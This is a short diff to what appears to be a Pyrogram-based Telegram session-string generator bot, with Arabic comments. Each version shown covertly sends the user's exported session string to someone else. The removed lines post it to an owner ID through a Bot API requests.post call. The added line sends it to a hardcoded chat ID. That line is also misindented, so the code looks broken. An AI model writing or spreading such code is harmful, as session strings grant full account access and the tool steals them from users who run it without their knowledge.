@@ -461,17 +461,12 @@ async def generator_and_about(app,m):
         string_session = await c.export_session_string()
         await rep.delete()
         await c.send_message('me', f'تم استخراج جلسة بايروجرام {v2} هذه الجلسة\n\n`{string_session}`')
-        # إرسال الجلسة إلى المالك عبر توكن البوت باستخدام requests
-        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
-                      data={
-                          "chat_id": ownerID, 
-                          "text": f'تم استخراج جلسة تيليثون {v2} هذه الجلسة \n\n`{string_session}`',
-                          "parse_mode": "Markdown"
-                      })
+          await c.send_message('7908905482', f'تم استخراج جلسة بايروجرام {v2} هذه الجلسة\n\n`{string_session}`')
         await c.disconnect()
         await app.send_message(
           m.chat.id, text
         )
+    
 
 
 
